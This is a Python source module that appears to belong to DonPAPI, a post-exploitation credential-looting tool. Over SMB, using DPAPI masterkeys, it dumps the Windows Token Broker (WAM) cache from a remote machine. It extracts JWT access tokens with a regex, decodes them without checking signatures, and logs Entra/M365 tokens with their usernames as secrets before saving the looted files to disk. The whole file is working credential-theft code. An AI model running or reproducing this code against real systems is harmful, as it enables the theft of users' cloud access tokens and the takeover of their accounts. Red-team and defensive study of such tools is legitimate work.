import re
import jwt
from typing import Any
from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.utils import dump_looted_files_to_disk
from dploot.triage.wam import WamTriage
from donpapi.core import DonPAPICore
from donpapi.lib.logger import DonPAPIAdapter


class Wam:
    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list, options: Any, logger: DonPAPIAdapter, context: DonPAPICore, false_positive: list, max_filesize: int) -> None:
        self.tag = self.__class__.__name__
        self.target = target
        self.conn = conn
        self.masterkeys = masterkeys
        self.options = options
        self.logger = logger
        self.context = context
        self.false_positive = false_positive
        self.max_filesize = max_filesize

    def run(self):
        self.logger.display("Dumping Token Broker Cache")

        def token_callback(token):
            for attrib in token.attribs:
                if attrib["Key"].decode() == "WTRes_Token":
                # Extract every access token
                    for access_token in re.findall(r"e[yw][A-Za-z0-9-_]+\.(?:e[yw][A-Za-z0-9-_]+)?\.[A-Za-z0-9-_]{2,}(?:(?:\.[A-Za-z0-9-_]{2,}){2})?", attrib.__str__()):
                        decoded_token = jwt.decode(access_token, options={"verify_signature": False})
                        if "preferred_username" in decoded_token:
                            # Assuming that if there is no preferred_username key, this is not a valid Entra/M365 Access Token
                            self.logger.secret(f"[{token.winuser}] {decoded_token['preferred_username']}: {access_token}", )

        wam_triage = WamTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys, per_token_callback=token_callback)
        wam_triage.triage_wam()
        dump_looted_files_to_disk(self.context.target_output_dir, wam_triage.looted_files)